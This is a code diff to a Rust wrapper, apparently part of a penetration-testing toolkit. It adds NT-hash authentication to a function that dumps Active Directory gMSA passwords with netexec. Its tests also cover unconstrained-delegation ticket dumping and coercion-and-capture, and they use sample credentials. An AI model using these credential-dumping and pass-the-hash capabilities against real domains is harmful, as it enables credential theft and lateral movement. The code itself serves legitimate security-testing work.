@@ -10,14 +10,18 @@ use crate::ToolOutput;
 
 /// Dump gMSA passwords using netexec's gmsa module.
 ///
-/// Required args: `dc_ip`, `username`, `password`, `domain`
+/// Required args: `dc_ip`, `username`, `domain`; one of `password` / `hash`.
+/// The gMSA's sole authorized reader is often a machine account (`HOST$`) known
+/// only by its NT hash, so hash auth (`-H`) must be supported — not just a
+/// plaintext password.
 pub async fn gmsa_dump_passwords(args: &Value) -> Result<ToolOutput> {
     let dc_ip = required_str(args, "dc_ip")?;
     let username = optional_str(args, "username");
     let password = optional_str(args, "password");
+    let hash = optional_str(args, "hash");
     let domain = optional_str(args, "domain");
 
-    let creds = credentials::netexec_creds(username, password, None, domain);
+    let creds = credentials::netexec_creds(username, password, hash, domain);
 
     CommandBuilder::new("netexec")
         .arg("ldap")
@@ -74,8 +78,6 @@ mod tests {
     use crate::args::{optional_str, required_str};
     use serde_json::json;
 
-    // --- gmsa_dump_passwords ---
-
     #[test]
     fn gmsa_dump_passwords_requires_dc_ip() {
         let args = json!({
@@ -122,8 +124,6 @@ mod tests {
         assert_eq!(optional_str(&args, "password"), Some("P@ssw0rd!"));
         assert_eq!(optional_str(&args, "domain"), Some("contoso.local"));
     }
-
-    // --- unconstrained_tgt_dump ---
 
     #[test]
     fn unconstrained_tgt_dump_missing_domain() {
@@ -182,8 +182,6 @@ mod tests {
         );
     }
 
-    // --- unconstrained_coerce_and_capture ---
-
     #[test]
     fn unconstrained_coerce_missing_coerce_from() {
         let args = json!({
@@ -222,8 +220,6 @@ mod tests {
         let creds = format!("{domain}/{username}:{password}@{coerce_from}");
         assert_eq!(creds, "contoso.local/admin:P@ssw0rd!@dc01.contoso.local");
     }
-
-    // --- mock executor tests ---
 
     use super::*;
     use crate::executor::mock;
